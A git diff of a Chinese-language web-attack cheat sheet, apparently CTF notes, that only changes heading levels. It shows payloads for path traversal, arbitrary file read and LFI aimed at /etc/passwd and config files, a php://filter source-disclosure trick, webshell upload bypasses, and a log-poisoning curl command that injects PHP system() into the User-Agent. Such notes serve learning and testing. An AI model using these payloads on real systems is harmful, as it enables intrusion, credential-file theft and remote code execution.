@@ -219,9 +219,9 @@ username[]=admin&username[]=guest
 - URL 是否包含副檔名
 - 嘗試加 `.php`、或改參數觀察錯誤格式
 
----
 
-### Webshell
+
+#### Webshell
 
 若可上傳 `.php` 檔，最簡 shell 範例：
 ```php
@@ -233,36 +233,36 @@ username[]=admin&username[]=guest
 - `.phtml`
 - 修改 Content-Type：`application/x-php`
 
----
 
-### Path Traversal
+
+#### Path Traversal
 
 跳目錄讀檔：
 ```
 /view.php?file=../../../../etc/passwd
 ```
 
----
 
-### Arbitrary File Read
+
+#### Arbitrary File Read
 
 若檔名可控，嘗試任意讀檔：
 ```
 /read?file=../../../config.php
 ```
 
----
 
-### LFI（Local File Inclusion）
+
+#### LFI（Local File Inclusion）
 
 從本地引入檔案漏洞：
 ```
 /?file=../../etc/passwd
 ```
 
----
 
-### PHP 偽協議與解析
+
+#### PHP 偽協議
 
 PHP 支援下列偽協議可繞過限制：
 
@@ -275,11 +275,11 @@ PHP 支援下列偽協議可繞過限制：
 ?file=php://filter/read=convert.base64-encode/resource=index.php
 ```
 
----
 
-### LFI to RCE 技巧
 
-#### Log Poisoning（日誌注入）
+#### LFI to RCE 技巧
+
+##### Log Poisoning（日誌注入）
 將 PHP 程式碼寫入日誌並透過 LFI 執行：
 ```bash
 curl -A "<?php system($_GET['cmd']); ?>" http://target.com
